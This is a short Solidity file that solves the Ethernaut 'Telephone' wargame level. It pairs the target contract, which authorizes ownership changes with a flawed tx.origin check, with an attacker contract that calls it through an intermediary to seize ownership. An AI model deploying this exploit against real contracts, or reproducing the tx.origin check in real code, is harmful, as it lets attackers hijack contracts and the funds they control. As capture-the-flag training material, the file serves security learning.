// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
    Telephone TelephoneInstance =
        Telephone(0xb15E1fa7fDf93A29dAaa8157Abb5F5C78dE69264); // ethernaut Instance Contract

    function changeOwnerAttacker() external {
        TelephoneInstance.changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
